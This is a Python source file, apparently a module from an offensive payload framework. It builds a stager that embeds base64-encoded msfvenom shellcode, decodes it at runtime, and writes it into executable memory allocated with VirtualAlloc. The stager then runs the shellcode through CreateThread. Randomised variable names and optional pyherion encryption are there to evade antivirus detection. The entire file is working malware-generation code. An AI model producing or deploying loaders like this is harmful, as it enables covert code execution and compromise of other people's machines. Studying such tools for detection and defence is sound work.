"""

This payload receives the msfvenom shellcode, base64 encodes it, and stores it within the payload.
At runtime, the executable decodes the shellcode and executes it in memory.


module by @christruncer

"""

import base64

from modules.common import shellcode
from modules.common import messages
from modules.common import randomizer
from modules.common import crypters
from modules.common import encryption


class Stager:
	
	def __init__(self):
		# required options
		self.shortname = "b64VirtualAlloc"
		self.description = "Base64 encoded shellcode is decoded at runtime and executed in memory"
		self.language = "python"
		self.rating = "Excellent"
		self.extension = "py"

		# options we require user interaction for- format is {Option : [Value, Description]]}
		self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
						"use_pyherion" : ["N", "Use the pyherion encrypter"]}
	
	def generate(self):
		
		# Generate Shellcode Using msfvenom
		self.shellcode = shellcode.Shellcode()
		Shellcode = self.shellcode.generate()
		
		# Base64 Encode Shellcode
		EncodedShellcode = base64.b64encode(Shellcode)    

		# Generate Random Variable Names
		ShellcodeVariableName = randomizer.randomString()
		RandPtr = randomizer.randomString()
		RandBuf = randomizer.randomString()
		RandHt = randomizer.randomString()
		RandT = randomizer.randomString()
					
		PayloadCode = 'import ctypes\n'
		PayloadCode +=  'import base64\n'
		PayloadCode += RandT + " = \"" + EncodedShellcode + "\"\n"
		PayloadCode += ShellcodeVariableName + " = bytearray(" + RandT + ".decode('base64','strict').decode(\"string_escape\"))\n"
		PayloadCode += RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(' + ShellcodeVariableName + ')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n'
		PayloadCode += RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName  + ')).from_buffer(' + ShellcodeVariableName + ')\n'
		PayloadCode += 'ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n'
		PayloadCode += RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
		PayloadCode += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'

		if self.required_options["use_pyherion"][0].lower() == "y":
			PayloadCode = crypters.pyherion(PayloadCode)

		return PayloadCode
